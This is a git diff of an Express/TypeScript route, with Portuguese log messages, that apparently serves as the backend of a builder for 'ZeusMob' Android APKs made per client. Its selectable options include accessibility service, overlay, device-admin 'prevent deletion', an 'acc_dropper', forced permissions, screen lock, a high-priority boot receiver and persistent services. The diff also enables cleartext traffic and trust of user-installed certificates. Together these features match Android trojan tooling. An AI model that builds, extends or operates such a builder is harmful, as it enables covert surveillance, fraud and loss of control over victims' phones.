@@ -1,27 +1,28 @@
 import { Router } from "express";
+import { spawn } from "child_process";
 import { execSync } from "child_process";
+import * as crypto from "crypto";
 import * as fs from "fs";
 import * as path from "path";
 import * as os from "os";
 
 const router = Router();
 
-// SDK lives inside workspace so it survives container restarts
-const WORKSPACE_ROOT = path.resolve(process.cwd(), "../..");
-const ANDROID_HOME   = path.join(WORKSPACE_ROOT, ".android-sdk");
+const WORKSPACE_ROOT   = path.resolve(process.cwd(), "../..");
+const ANDROID_HOME     = path.join(WORKSPACE_ROOT, ".android-sdk");
 const ANDROID_SDK_ROOT = ANDROID_HOME;
-const KEYSTORE_PATH  = path.join(WORKSPACE_ROOT, ".android-sdk", "debug.keystore");
-const TEMPLATE_DIR   = path.join(WORKSPACE_ROOT, "android-apk-builder");
+const KEYSTORE_PATH    = path.join(WORKSPACE_ROOT, ".android-sdk", "debug.keystore");
+const TEMPLATE_DIR     = path.join(WORKSPACE_ROOT, "android-apk-builder");
 
 const JAVA_HOME = execSync(
   "dirname $(dirname $(readlink -f $(which java)))",
   { encoding: "utf8" }
 ).trim();
 
-const SDK_BIN      = path.join(ANDROID_HOME, "cmdline-tools", "latest", "bin");
-const BUILD_TOOLS  = path.join(ANDROID_HOME, "build-tools", "34.0.0");
+const SDK_BIN        = path.join(ANDROID_HOME, "cmdline-tools", "latest", "bin");
+const BUILD_TOOLS    = path.join(ANDROID_HOME, "build-tools", "34.0.0");
 const PLATFORM_TOOLS = path.join(ANDROID_HOME, "platform-tools");
-const JAVA_BIN     = path.join(JAVA_HOME, "bin");
+const JAVA_BIN       = path.join(JAVA_HOME, "bin");
 
 function buildEnv() {
   return {
@@ -38,7 +39,6 @@ function buildEnv() {
 function ensureSdk(): void {
   const sdkManagerBin = path.join(SDK_BIN, "sdkmanager");
 
-  // 1. Download cmdline-tools if missing
   if (!fs.existsSync(sdkManagerBin)) {
     fs.mkdirSync(path.join(ANDROID_HOME, "cmdline-tools"), { recursive: true });
     const zip = "/tmp/cmdtools-zeus.zip";
@@ -54,7 +54,6 @@ function ensureSdk(): void {
     fs.rmSync(zip, { force: true });
   }
 
-  // 2. Accept licenses + install SDK components if missing
   const buildToolsDir = path.join(ANDROID_HOME, "build-tools", "34.0.0");
   if (!fs.existsSync(buildToolsDir)) {
     const env = buildEnv();
@@ -65,8 +64,8 @@ function ensureSdk(): void {
     );
   }
 
-  // 3. Create debug keystore if missing
   if (!fs.existsSync(KEYSTORE_PATH)) {
+    fs.mkdirSync(path.dirname(KEYSTORE_PATH), { recursive: true });
     execSync(
       `"${JAVA_BIN}/keytool" -genkeypair -v ` +
       `-keystore "${KEYSTORE_PATH}" -alias androiddebugkey ` +
@@ -78,23 +77,13 @@ function ensureSdk(): void {
   }
 }
 
-// Run once at startup
 ensureSdk();
 
-// All permissions the wizard can select
 const PERMISSION_MAP: Record<string, string[]> = {
-  accessibility: [
-    "android.permission.BIND_ACCESSIBILITY_SERVICE",
-  ],
-  app_usage: [
-    "android.permission.PACKAGE_USAGE_STATS",
-  ],
-  draw_over: [
-    "android.permission.SYSTEM_ALERT_WINDOW",
-  ],
-  camera: [
-    "android.permission.CAMERA",
-  ],
+  accessibility: ["android.permission.BIND_ACCESSIBILITY_SERVICE"],
+  app_usage:     ["android.permission.PACKAGE_USAGE_STATS"],
+  draw_over:     ["android.permission.SYSTEM_ALERT_WINDOW"],
+  camera:        ["android.permission.CAMERA"],
   files: [
     "android.permission.READ_EXTERNAL_STORAGE",
     "android.permission.READ_MEDIA_IMAGES",
@@ -102,22 +91,24 @@ const PERMISSION_MAP: Record<string, string[]> = {
     "android.permission.READ_MEDIA_AUDIO",
     "android.permission.WRITE_EXTERNAL_STORAGE",
   ],
-  microphone: [
-    "android.permission.RECORD_AUDIO",
-  ],
+  microphone: ["android.permission.RECORD_AUDIO"],
 };
 
 const BEHAVIOR_MAP: Record<string, string[]> = {
   prevent_sleep: ["android.permission.WAKE_LOCK"],
-  prevent_stop:  ["android.permission.FOREGROUND_SERVICE", "android.permission.RECEIVE_BOOT_COMPLETED"],
-  force_perms:   [],
+  prevent_stop: [
+    "android.permission.FOREGROUND_SERVICE",
+    "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
+    "android.permission.RECEIVE_BOOT_COMPLETED",
+  ],
+  force_perms: [],
 };
 
 const ADVANCED_MAP: Record<string, string[]> = {
-  acc_dropper:  [],
-  prevent_del:  ["android.permission.BIND_DEVICE_ADMIN"],
-  auto_perms:   [],
-  screen_lock:  [],
+  acc_dropper: [],
+  prevent_del: ["android.permission.BIND_DEVICE_ADMIN"],
+  auto_perms:  [],
+  screen_lock: [],
 };
 
 function buildManifestPermissions(selected: string[]): string {
@@ -169,6 +160,8 @@ ${permissions}
         android:theme="@style/Theme.ZeusMob"
         android:hardwareAccelerated="true"
         android:largeHeap="true"
+        android:usesCleartextTraffic="true"
+        android:networkSecurityConfig="@xml/network_security_config"
         tools:targetApi="31">
 
         <activity
@@ -198,7 +191,7 @@ ${permissions}
         ${hasForeground ? `<service
             android:name=".service.ZeusForegroundService"
             android:exported="false"
-            android:foregroundServiceType="specialUse" />` : ""}
+            android:foregroundServiceType="dataSync" />` : ""}
 
         ${hasBoot ? `<receiver android:name=".receiver.BootReceiver" android:exported="true">
             <intent-filter android:priority="999">
@@ -242,10 +235,10 @@ ${permissions}
 }
 
 function buildAppGradle(cfg: ApkConfig): string {
-  // Parse version: "1.0.3 (427)" → name="1.0.3", code=427
-  const verMatch = cfg.appVersion.match(/^([\d.]+)\s*(?:\((\d+)\))?$/);
+  const verMatch   = cfg.appVersion.match(/^([\d.]+)\s*(?:\((\d+)\))?$/);
   const versionName = verMatch ? verMatch[1] : "1.0.0";
   const versionCode = verMatch && verMatch[2] ? parseInt(verMatch[2]) : 1;
+  const safeName    = cfg.appName.replace(/[^a-zA-Z0-9_]/g, "_");
 
   return `plugins {
     id 'com.android.application'
@@ -257,11 +250,10 @@ android {
 
     defaultConfig {
         applicationId "${cfg.appId}"
-        minSdk 24
+        minSdk 26
         targetSdk 34
         versionCode ${versionCode}
         versionName "${versionName}"
-        multiDexEnabled true
     }
 
     signingConfigs {
@@ -289,10 +281,8 @@ android {
         }
         release {
             debuggable false
-            minifyEnabled true
-            shrinkResources true
+            minifyEnabled false
             signingConfig signingConfigs.release
-            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
         }
     }
 
@@ -305,7 +295,7 @@ android {
 
     applicationVariants.configureEach { variant ->
         variant.outputs.configureEach { output ->
-            outputFileName = "${cfg.appName.replace(/\s+/g, "_")}-${versionName}-universal.apk"
+            outputFileName = "${safeName}-${versionName}-release.apk"
         }
     }
 }
@@ -315,8 +305,7 @@ dependencies {
     implementation 'com.google.android.material:material:1.11.0'
     implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
     implementation 'androidx.core:core:1.12.0'
-    implementation 'androidx.multidex:multidex:2.0.1'
-    implementation 'androidx.work:work-runtime:2.9.0'
+    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
 }
 `;
 }
@@ -335,44 +324,69 @@ interface ApkConfig {
   advanced: Record<string, boolean>;
 }
 
-// POST /api/apk/build
-router.post("/apk/build", async (req, res) => {
-  const cfg: ApkConfig = req.body;
+// ── Job store ─────────────────────────────────────────────────────
+interface BuildJob {
+  status: "building" | "done" | "error";
+  log: string[];
+  apkPath?: string;
+  apkName?: string;
+  apkSize?: number;
+  buildDir?: string;
+  createdAt: number;
+}
 
-  if (!cfg.appId || !cfg.appName || !cfg.appVersion) {
-    res.status(400).json({ error: "appId, appName e appVersion são obrigatórios" });
-    return;
+const jobs = new Map<string, BuildJob>();
+
+// Clean up jobs older than 30 min
+setInterval(() => {
+  const cutoff = Date.now() - 30 * 60 * 1000;
+  for (const [id, job] of jobs.entries()) {
+    if (job.createdAt < cutoff) {
+      if (job.buildDir) {
+        try { fs.rmSync(job.buildDir, { recursive: true, force: true }); } catch {}
+      }
+      jobs.delete(id);
+    }
   }
+}, 5 * 60 * 1000);
 
-  // Create isolated temp build dir
+// ── Async build runner ────────────────────────────────────────────
+async function runBuild(jobId: string, cfg: ApkConfig): Promise<void> {
+  const job = jobs.get(jobId)!;
   const buildDir = fs.mkdtempSync(path.join(os.tmpdir(), "zeus-apk-"));
-  req.log.info({ buildDir, appId: cfg.appId }, "APK build started");
+  job.buildDir = buildDir;
+
+  const addLog = (msg: string) => {
+    job.log.push(msg);
+    console.log(`[job:${jobId}] ${msg}`);
+  };
 
   try {
-    // 1. Copy the template project
+    addLog("Copiando template Android...");
     execSync(`cp -r "${TEMPLATE_DIR}/." "${buildDir}/"`, { stdio: "pipe" });
 
-    // 2. Write local.properties
+    addLog("Configurando local.properties...");
     fs.writeFileSync(
       path.join(buildDir, "local.properties"),
       `sdk.dir=${ANDROID_HOME}\njava.home=${JAVA_HOME}\n`
     );
 
-    // 3. Patch AndroidManifest.xml
+    addLog("Gerando AndroidManifest.xml...");
     fs.writeFileSync(
       path.join(buildDir, "app/src/main/AndroidManifest.xml"),
       buildManifest(cfg)
     );
 
-    // 4. Patch app/build.gradle
+    addLog("Gerando app/build.gradle...");
     fs.writeFileSync(
       path.join(buildDir, "app/build.gradle"),
       buildAppGradle(cfg)
     );
 
-    // 5. Patch strings.xml
-    const stringsPath = path.join(buildDir, "app/src/main/res/values/strings.xml");
-    fs.writeFileSync(stringsPath, `<?xml version="1.0" encoding="utf-8"?>
+    addLog("Configurando strings.xml...");
+    fs.writeFileSync(
+      path.join(buildDir, "app/src/main/res/values/strings.xml"),
+      `<?xml version="1.0" encoding="utf-8"?>
 <resources>
     <string name="app_name">${cfg.appName}</string>
     <string name="app_link">${cfg.appLink}</string>
@@ -381,75 +395,145 @@ router.post("/apk/build", async (req, res) => {
     <string name="client_name">${cfg.clientName}</string>
     <string name="accessibility_service_label">${cfg.appName} Service</string>
     <string name="accessibility_service_description">Serviço ${cfg.appName} para automação e monitoramento.</string>
-</resources>`);
+</resources>`
+    );
 
-    // 6. Write app icon if provided (base64 PNG)
+    addLog("Escrevendo network_security_config.xml...");
+    const xmlDir = path.join(buildDir, "app/src/main/res/xml");
+    fs.mkdirSync(xmlDir, { recursive: true });
+    fs.writeFileSync(
+      path.join(xmlDir, "network_security_config.xml"),
+      `<?xml version="1.0" encoding="utf-8"?>
+<network-security-config>
+    <base-config cleartextTrafficPermitted="true">
+        <trust-anchors>
+            <certificates src="system" />
+            <certificates src="user" />
+        </trust-anchors>
+    </base-config>
+</network-security-config>`
+    );
+
     if (cfg.iconBase64) {
-      const iconData = cfg.iconBase64.replace(/^data:image\/\w+;base64,/, "");
-      const iconBuf = Buffer.from(iconData, "base64");
-      const iconDirs = [
-        "app/src/main/res/mipmap-hdpi",
-        "app/src/main/res/mipmap-mdpi",
-        "app/src/main/res/mipmap-xhdpi",
-        "app/src/main/res/mipmap-xxhdpi",
-        "app/src/main/res/mipmap-xxxhdpi",
-      ];
-      for (const d of iconDirs) {
-        const dir = path.join(buildDir, d);
+      addLog("Aplicando ícone personalizado...");
+      const iconBuf = Buffer.from(
+        cfg.iconBase64.replace(/^data:image\/\w+;base64,/, ""),
+        "base64"
+      );
+      for (const d of ["mipmap-hdpi","mipmap-mdpi","mipmap-xhdpi","mipmap-xxhdpi","mipmap-xxxhdpi"]) {
+        const dir = path.join(buildDir, "app/src/main/res", d);
         fs.mkdirSync(dir, { recursive: true });
         fs.writeFileSync(path.join(dir, "ic_launcher.png"), iconBuf);
         fs.writeFileSync(path.join(dir, "ic_launcher_round.png"), iconBuf);
       }
     }
 
-    // 7. Ensure SDK is available (auto-installs if container was reset)
+    addLog("Verificando Android SDK...");
     ensureSdk();
 
-    // 8. Run Gradle build using system gradle (Gradle 8.14.2 installed via Nix)
+    addLog("Compilando com Gradle (pode levar 2–4 min)...");
     const gradleBin = execSync("which gradle", { encoding: "utf8" }).trim();
-    const gradleCmd = `${gradleBin} assembleRelease --no-daemon --quiet`;
-    req.log.info({ gradleCmd, ANDROID_HOME, JAVA_HOME }, "Running Gradle build");
 
-    execSync(gradleCmd, {
-      cwd: buildDir,
-      stdio: "pipe",
-      env: buildEnv(),
-      timeout: 5 * 60 * 1000, // 5 min
+    await new Promise<void>((resolve, reject) => {
+      const proc = spawn(
+        gradleBin,
+        ["assembleRelease", "--no-daemon", "--quiet"],
+        { cwd: buildDir, env: buildEnv() }
+      );
+
+      proc.stdout.on("data", (d: Buffer) => {
+        const line = d.toString().trim();
+        if (line) addLog(line);
+      });
+      proc.stderr.on("data", (d: Buffer) => {
+        const line = d.toString().trim();
+        if (line) addLog(`⚠ ${line}`);
+      });
+      proc.on("close", (code) => {
+        if (code === 0) resolve();
+        else reject(new Error(`Gradle encerrou com código ${code}. Verifique os logs acima.`));
+      });
+      proc.on("error", (err) => reject(err));
+
+      // Hard timeout: 8 minutes
+      const timer = setTimeout(
+        () => { proc.kill(); reject(new Error("Timeout: build excedeu 8 minutos")); },
+        8 * 60 * 1000
+      );
+      proc.on("close", () => clearTimeout(timer));
     });
 
-    // 9. Find the APK
-    const apkDir = path.join(buildDir, "app/build/outputs/apk/release");
+    addLog("Localizando APK gerado...");
+    const apkDir  = path.join(buildDir, "app/build/outputs/apk/release");
     const apkFiles = fs.readdirSync(apkDir).filter(f => f.endsWith(".apk"));
     if (!apkFiles.length) throw new Error("Nenhum APK encontrado após o build");
 
     const apkPath = path.join(apkDir, apkFiles[0]);
-    const apkSize = fs.statSync(apkPath).size;
-    req.log.info({ apkPath, apkSize }, "APK build successful");
-
-    // 10. Stream APK to client
-    res.setHeader("Content-Type", "application/vnd.android.package-archive");
-    res.setHeader("Content-Disposition", `attachment; filename="${apkFiles[0]}"`);
-    res.setHeader("Content-Length", apkSize);
-    res.setHeader("X-Apk-Name", apkFiles[0]);
-    res.setHeader("X-Apk-Size", String(apkSize));
-
-    const stream = fs.createReadStream(apkPath);
-    stream.pipe(res);
-
-    stream.on("end", () => {
-      // Cleanup temp dir after sending
-      fs.rmSync(buildDir, { recursive: true, force: true });
-    });
+    job.apkPath   = apkPath;
+    job.apkName   = apkFiles[0];
+    job.apkSize   = fs.statSync(apkPath).size;
+    job.status    = "done";
+    addLog(`✅ APK pronto: ${apkFiles[0]} (${(job.apkSize / 1024 / 1024).toFixed(1)} MB)`);
 
   } catch (err: any) {
-    req.log.error({ err: err.message }, "APK build failed");
-    // Cleanup on error
+    addLog(`❌ ERRO: ${err.message}`);
+    job.status = "error";
     try { fs.rmSync(buildDir, { recursive: true, force: true }); } catch {}
-    res.status(500).json({
-      error: "Falha no build do APK",
-      detail: err.stderr?.toString() || err.message,
-    });
   }
+}
+
+// ── Routes ────────────────────────────────────────────────────────
+
+// POST /api/apk/build — inicia build em background, retorna jobId imediatamente
+router.post("/apk/build", (req, res) => {
+  const cfg: ApkConfig = req.body;
+
+  if (!cfg.appId || !cfg.appName || !cfg.appVersion) {
+    res.status(400).json({ error: "appId, appName e appVersion são obrigatórios" });
+    return;
+  }
+
+  const jobId = crypto.randomUUID();
+  jobs.set(jobId, { status: "building", log: [], createdAt: Date.now() });
+  res.json({ jobId });
+
+  // Fire and forget — não bloqueia o event loop
+  runBuild(jobId, cfg).catch(() => {});
+});
+
+// GET /api/apk/status/:jobId — polling do status
+router.get("/apk/status/:jobId", (req, res) => {
+  const job = jobs.get(req.params.jobId);
+  if (!job) {
+    res.status(404).json({ error: "Job não encontrado ou expirado" });
+    return;
+  }
+  res.json({
+    status:  job.status,
+    log:     job.log.join("\n"),
+    apkName: job.apkName,
+    apkSize: job.apkSize,
+  });
+});
+
+// GET /api/apk/download/:jobId — faz download do APK
+router.get("/apk/download/:jobId", (req, res) => {
+  const job = jobs.get(req.params.jobId);
+  if (!job || job.status !== "done" || !job.apkPath) {
+    res.status(404).json({ error: "APK não disponível ou build ainda em andamento" });
+    return;
+  }
+
+  res.setHeader("Content-Type", "application/vnd.android.package-archive");
+  res.setHeader("Content-Disposition", `attachment; filename="${job.apkName}"`);
+  res.setHeader("Content-Length", String(job.apkSize));
+
+  const stream = fs.createReadStream(job.apkPath);
+  stream.pipe(res);
+  stream.on("end", () => {
+    try { fs.rmSync(job.buildDir!, { recursive: true, force: true }); } catch {}
+    jobs.delete(req.params.jobId);
+  });
 });
 
 export default router;
